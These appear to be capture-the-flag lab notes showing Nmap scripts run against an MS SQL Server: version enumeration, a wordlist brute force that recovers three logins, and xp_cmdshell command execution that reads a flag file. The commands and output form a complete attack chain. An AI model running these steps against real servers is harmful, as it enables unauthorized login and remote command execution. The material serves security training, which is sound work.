# Nmap scripts

msl-sql-info

```
root@attackdefense:~# nmap 10.4.27.79 -p1433 --script ms-sql-info
Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-28 03:44 IST
Nmap scan report for 10.4.27.79
Host is up (0.0090s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Host script results:
| ms-sql-info: 
|   10.4.27.79:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

ms-sql-brute

```
root@attackdefense:~# nmap 10.4.27.79 -p1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 
Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-28 04:22 IST
Nmap scan report for 10.4.27.79
Host is up (0.010s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-brute: 
|   [10.4.27.79:1433]
|     Credentials found:
|       dbadmin:bubbles1 => Login Success
|       auditor:jasmine1 => Login Success
|_      admin:anamaria => Login Success

Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds
```

ms-sql-xp-cmdshell

```
root@attackdefense:~# nmap 10.4.27.79 -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type C:\flag.txt"
Starting Nmap 7.91 ( https://nmap.org ) at 2023-11-28 04:31 IST
Nmap scan report for 10.4.27.79
Host is up (0.011s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-xp-cmdshell: 
|   [10.4.27.79:1433]
|     Command: type C:\flag.txt
|       output
|       ======
|_      1d1803570245aa620446518b2154f324

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
```
